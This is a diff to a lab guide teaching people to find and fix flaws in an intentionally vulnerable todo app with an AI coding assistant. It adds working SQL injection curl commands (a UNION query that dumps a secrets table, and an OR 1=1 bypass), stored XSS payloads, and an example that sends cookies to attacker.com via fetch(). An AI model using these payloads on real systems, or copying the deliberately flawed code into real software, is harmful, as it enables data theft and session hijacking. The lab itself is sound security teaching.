@@ -23,7 +23,7 @@ A vulnerable todo application with intentional security flaws:
 
 By the end of this lab, you will:
 - ✅ Use Ask mode to understand existing codebases
-- ✅ Use Architect mode to identify bugs and plan fixes
+- ✅ Use Plan mode to identify bugs and plan fixes
 - ✅ Recognize SQL injection vulnerabilities
 - ✅ Identify XSS attack vectors
 - ✅ Find hardcoded secrets and credentials
@@ -117,7 +117,7 @@ Bob should explain that the function uses string formatting to build SQL queries
 
 ## Step 2: Bug Identification with Plan Mode (10 minutes)
 
-Now let's use Architect mode to systematically identify all the issues.
+Now let's use Plan mode to systematically identify all the issues.
 
 ### 2.1: Switch to Plan Mode
 
@@ -128,7 +128,7 @@ Change from Ask to **Plan Mode** (🎯).
 > **💡 Using Bob Findings**
 > Bob Findings can automatically scan your code for security vulnerabilities, code quality issues, and compliance violations. The analysis you're about to request demonstrates Bob's [Security Vulnerability Detection](../bob-differentiators.md#security-vulnerability-detection) capabilities, which go beyond basic static analysis to provide context-aware recommendations.
 
-**Prompt for Bob:**
+**Click on "Start new Task" and Prompt for Bob:**
 
 ```
 Analyze the codebase in lab2/vulnerable-app/ for security vulnerabilities.
@@ -197,7 +197,7 @@ Bob will create a detailed TODO list with all the fixes needed. This demonstrate
 
 ## Step 3: Security Vulnerability Deep Dive (15 minutes) - Optional
 
-This step provides a detailed explanation of each vulnerability type. If you're already familiar with these security concepts, you can skip to [Step 4: Implementing Fixes](#step-4-implementing-fixes-10-minutes).
+This step provides a detailed explanation of each vulnerability type. If you're already familiar with these security concepts, you can skip to [Step 3.4: Testing Vulnerabilities](#34-testing-vulnerabilities).
 
 **What you'll learn in this deep dive:**
 - How SQL injection attacks work
@@ -218,7 +218,8 @@ def search_todos():
     query = request.args.get('q')
     # VULNERABLE: Direct string formatting in SQL
     sql = f"SELECT * FROM todos WHERE title LIKE '%{query}%'"
-    results = db.session.execute(sql)
+    from sqlalchemy import text
+    results = db.session.execute(text(sql))
     return jsonify([dict(row) for row in results])
 ```
 
@@ -312,9 +313,18 @@ function displayTodo(todo) {
 **Vulnerable Code:**
 ```python
 # VULNERABLE: Hardcoded credentials
-DATABASE_URL = "postgresql://admin:SuperSecret123@localhost/todos"
 API_KEY = "sk_live_abc123xyz789"
 SECRET_KEY = "my-secret-key-12345"
+
+# Note: SQLite doesn't use authentication, but these demonstrate
+# the vulnerability pattern that exists with other databases, e.g., PostgreSQL
+DB_USERNAME = "admin"
+DB_PASSWORD = "SuperSecret123"
+DB_HOST = "localhost"
+DB_PORT = "5432"
+DB_NAME = "todos_db"
+
+DATABASE_URL = "sqlite:///todos.db"
 ```
 
 **The Problem:**
@@ -352,28 +362,104 @@ if not all([DATABASE_URL, API_KEY, SECRET_KEY]):
 
 Create `.env` file (never commit this!):
 ```
-DATABASE_URL=postgresql://admin:SuperSecret123@localhost/todos
+DATABASE_URL=sqlite:///todos.db
 API_KEY=sk_live_abc123xyz789
 SECRET_KEY=my-secret-key-12345
 ```
 
 ### 3.4: Testing Vulnerabilities
+Before testing the vulnerabilities, you need to start both the backend and frontend.
+
+```bash
+# Navigate to the backend directory
+cd lab2/vulnerable-app/backend
+
+# Create a .env file from .env.example
+cp .env.example .env
+
+# Start backend
+python -m venv .venv
+source .venv/bin/activate  # or .venv\Scripts\activate on Windows
+pip install -r requirements.txt
+python app.py
+
+# Start the frontend and open it in your browser
+cd ../frontend
+open index.html
+```
+
+**Verify the Application is Running:**
+
+1. Backend: Visit `http://localhost:8080/api/todos` - you should see an array of example todo's
+2. Frontend: Open the frontend URL - you should see the Todo application interface
 
 **⚠️ WARNING**: Only test on your own systems!
+**Test SQL Injection  - Expose Secret (UNION Attack):**
 
-**Test SQL Injection:**
+The problem: The search endpoint builds SQL queries using string formatting, allowing attackers to inject their own SQL commands. The database contains a `secrets` table with sensitive information.
+
 ```bash
-# Try to inject SQL
-curl "http://localhost:5000/api/todos/search?q=test'%20OR%20'1'='1"
+# This UNION attack combines results from todos and secrets tables
+# The query injects: ' UNION SELECT id, secret_text, secret_text, 0, '' FROM secrets --
+curl "http://localhost:8080/api/todos/search?q=%27%20UNION%20SELECT%20id,%20secret_text,%20secret_text,%200,%20%27%27%20FROM%20secrets%20--%20"
 ```
 
-**Test XSS:**
+**How it works:**
+1. The `'` closes the original LIKE string
+2. `UNION SELECT` combines results from another query
+3. We select 5 columns to match the todos table structure (id, title, description, completed, created_at)
+4. `FROM secrets` targets the sensitive data table
+5. `--` comments out the rest of the original query
+
+Expected result: You should see the secret flag exposed in the response:
+```json
+[
+    {...},
+  {
+    "id": 1,
+    "title": "FLAG{SQL_1nj3ct10n_1s_d4ng3r0us!_Pr0t3ct_Y0ur_D4t4}",
+    "description": "FLAG{SQL_1nj3ct10n_1s_d4ng3r0us!_Pr0t3ct_Y0ur_D4t4}",
+    "completed": false,
+    "created_at": ""
+  },
+  ...
+]
+```
+
+**Alternative test - Get all todos (bypass filter):**
 ```bash
-# Create todo with script
-curl -X POST http://localhost:5000/api/todos \
+# This makes the WHERE clause always true, returning all todos
+curl "http://localhost:8080/api/todos/search?q=%25%27%20OR%20%271%27%3D%271"
+```
+
+**What makes SQL injection dangerous:**
+- Attackers can read sensitive data from any table in the database
+- They can modify or delete data (DROP TABLE, UPDATE, DELETE)
+- They can bypass authentication and authorization
+- They can potentially execute system commands on the database server
+
+**Test XSS (Cross-Site Scripting):**
+
+The problem: The frontend uses `innerHTML` to display todo titles and descriptions without sanitization. Event handlers like `onerror` execute, allowing for XSS attacks.
+
+```bash
+# Payload that modifies the page
+curl -X POST http://localhost:8080/api/todos \
   -H "Content-Type: application/json" \
-  -d '{"title":"<script>alert(\"XSS\")</script>","description":"test"}'
+  -d '{"title":"<img src=x onerror=\"document.body.style.backgroundColor='"'"'red'"'"'\">","description":"Changes background"}'
+
+# Payload that could steal data
+curl -X POST http://localhost:8080/api/todos \
+  -H "Content-Type: application/json" \
+  -d '{"title":"<img src=x onerror=\"console.log('"'"'Cookies:'"'"', document.cookie)\">","description":"Logs cookies"}'
 ```
+
+**What makes this dangerous:**
+- The malicious script runs with the same privileges as the legitimate application
+- It can access cookies, localStorage, and make requests on behalf of the user
+- It can modify the page content or redirect users to phishing sites
+- The script persists in the database and affects all users who view the todo
+- Real attacks could exfiltrate data: `<img src=x onerror="fetch('https://attacker.com?cookie='+document.cookie)">`
 
 ---
 
@@ -438,22 +524,37 @@ Return appropriate error messages for invalid input.
 Run the application and test the fixes:
 
 ```bash
-# Start backend (from the vulnerable-app directory where fixes were applied)
 cd lab2/vulnerable-app/backend
-python -m venv venv
-source venv/bin/activate  # or venv\Scripts\activate on Windows
+
+# Create a .env file from .env.example
+# ONLY DO THAT IF NOT DONE ALREADY
+cp .env.example .env 
+
+# Start backend (from the vulnerable-app directory where fixes were applied)
+python -m venv .venv
+source .venv/bin/activate  # or .venv\Scripts\activate on Windows
 pip install -r requirements.txt
-python app.py # may conflict with AirPlay on the Mac, in which case run the following instead:
-FLASK_RUN_PORT=8080 flask run
+python app.py
 
 # Open frontend (from the vulnerable-app directory)
 cd ../frontend
-# Open index.html in browser
+open index.html
 ```
 
 **Test Security:**
 1. Try SQL injection - should fail safely (no data leaked)
+    ```bash
+    # This UNION attack combines results from todos and secrets tables
+    # The query injects: ' UNION SELECT id, secret_text, secret_text, 0, '' FROM secrets --
+    curl "http://localhost:8080/api/todos/search?q=%27%20UNION%20SELECT%20id,%20secret_text,%20secret_text,%200,%20%27%27%20FROM%20secrets%20--%20"
+    ```
 2. Try XSS payload - should display as plain text (not execute)
+    ```bash
+    # Payload that modifies the page
+    curl -X POST http://localhost:8080/api/todos \
+    -H "Content-Type: application/json" \
+    -d '{"title":"<img src=x onerror=\"document.body.style.backgroundColor='"'"'red'"'"'\">","description":"Changes background"}'
+    ```
 3. Check no secrets in code (verify config.py uses environment variables)
 4. Test input validation (try empty title, too long title, etc.)
 
@@ -467,7 +568,7 @@ If you want to see the original vulnerable code, check the `lab2/solution/` dire
 You've successfully completed Lab 2! You've learned to:
 
 - ✅ Use Ask mode to understand existing code
-- ✅ Use Architect mode for security analysis
+- ✅ Use Plan mode for security analysis
 - ✅ Identify SQL injection vulnerabilities
 - ✅ Recognize XSS attack vectors
 - ✅ Find and fix hardcoded secrets
@@ -510,9 +611,10 @@ You've successfully completed Lab 2! You've learned to:
 ```python
 # SQL Injection risk
 sql = f"SELECT * FROM todos WHERE title LIKE '%{query}%'"
+result = db.session.execute(text(sql))
 
 # Hardcoded secrets
-DATABASE_URL = "postgresql://admin:password@localhost/db"
+API_KEY = "sk_live_abc123xyz789_this_is_a_secret_key"
 
 # XSS risk
 element.innerHTML = `<h3>${userInput}</h3>`
@@ -520,11 +622,11 @@ element.innerHTML = `<h3>${userInput}</h3>`
 
 ### After (Secure)
 ```python
-# Safe parameterized query
+# Safe parameterized query (ORM handles escaping)
 results = Todo.query.filter(Todo.title.like(f'%{query}%')).all()
 
-# Environment variables
-DATABASE_URL = os.getenv('DATABASE_URL')
+# Environment variables (loaded from .env file)
+API_KEY = os.getenv('API_KEY')
 
 # Safe DOM manipulation
 element.textContent = userInput
